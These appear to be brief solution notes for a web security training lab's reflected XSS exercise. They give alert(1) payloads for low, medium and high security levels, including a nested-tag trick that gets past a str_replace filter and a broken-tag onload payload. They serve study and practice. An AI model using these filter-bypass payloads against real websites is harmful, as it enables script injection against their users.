### Security level: LOW
* Solution: <script> alert(1) </script>

### Security level: MEDIUM:

* Solution: <s<script>cript>alert(1)</script>
* circumvented str_replace( '<script>', '')

### Security level: HIGH:

* Solution: <<meta>body onload=alert(1)>
* similar to stored XSS page